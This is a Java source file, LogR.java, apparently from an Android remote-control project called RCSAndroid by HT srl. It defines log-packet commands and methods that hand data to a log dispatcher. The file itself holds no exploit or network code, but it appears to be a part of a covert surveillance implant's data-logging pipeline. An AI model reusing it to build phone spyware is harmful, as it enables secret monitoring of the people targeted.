/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : LogR.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI;

import com.ht.RCSAndroidGUI.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class LogR.
 */
public class LogR {
	
	/** The type. */
	private final int type;
	
	/** The unique. */
	private final long unique;
	
	/** The disp. */
	private LogDispatcher disp;

	/** The Constant LOG_CREATE. */
	final public static int LOG_CREATE = 0x1;
	
	/** The Constant LOG_ADDITIONAL. */
	final public static int LOG_ADDITIONAL = 0x2;
	
	/** The Constant LOG_APPEND. */
	final public static int LOG_APPEND = 0x3;
	
	/** The Constant LOG_WRITE. */
	final public static int LOG_WRITE = 0x4;
	
	/** The Constant LOG_CLOSE. */
	final public static int LOG_CLOSE = 0x5;
	
	/** The Constant LOG_REMOVE. */
	final public static int LOG_REMOVE = 0x6;
	
	/** The Constant LOG_REMOVEALL. */
	final public static int LOG_REMOVEALL = 0x7;
	
	/** The Constant LOG_WRITEMRK. */
	final public static int LOG_WRITEMRK = 0x8;

	/** The Constant LOG_PRI_MAX. */
	final public static int LOG_PRI_MAX = 0x1;
	
	/** The Constant LOG_PRI_STD. */
	final public static int LOG_PRI_STD = 0x7f;
	
	/** The Constant LOG_PRI_MIN. */
	final public static int LOG_PRI_MIN = 0xff;

	/**
	 * Instantiates a new log r.
	 *
	 * @param logType the log type
	 * @param priority the priority
	 */
	public LogR(final int logType, final int priority) {
		unique = Utils.getUniqueId();
		disp = LogDispatcher.self();
		type = logType;

		final Packet p = new Packet(unique);

		p.setType(type);
		p.setPriority(priority);
		p.setCommand(LOG_CREATE);

		send(p);
	}

	/**
	 * Instantiates a new log r.
	 *
	 * @param logType the log type
	 * @param priority the priority
	 * @param additional the additional
	 */
	public LogR(final int logType, final int priority, final byte[] additional) {
		unique = Utils.getUniqueId();
		disp = LogDispatcher.self();
		type = logType;

		final Packet p = new Packet(unique);

		p.setType(type);
		p.setPriority(priority);
		p.setCommand(LOG_CREATE);

		send(p);

		final Packet add = new Packet(unique);
		add.setCommand(LOG_ADDITIONAL);
		add.fill(additional);

		send(add);
	}

	// Send data to dispatcher
	/**
	 * Send.
	 *
	 * @param p the p
	 */
	private void send(final Packet p) {
		if (disp == null) {
			disp = LogDispatcher.self();

			if (disp == null) {
				return;
			}
		}

		disp.send(p);
	}

	/**
	 * Write.
	 *
	 * @param data the data
	 */
	public void write(final byte[] data) {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_WRITE);
		p.fill(data);

		send(p);
		return;
	}

	/**
	 * Write markup.
	 *
	 * @param data the data
	 */
	public void writeMarkup(final byte[] data) {
		final Packet p = new Packet(unique);

		p.setType(type);
		p.setCommand(LOG_WRITEMRK);
		p.fill(data);

		send(p);
		return;
	}

	/**
	 * Append.
	 *
	 * @param data the data
	 */
	public void append(final byte[] data) {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_APPEND);
		p.fill(data);

		send(p);
		return;
	}

	/**
	 * Close.
	 */
	public void close() {
		final Packet p = new Packet(unique);

		p.setCommand(LOG_CLOSE);

		send(p);
		return;
	}
}
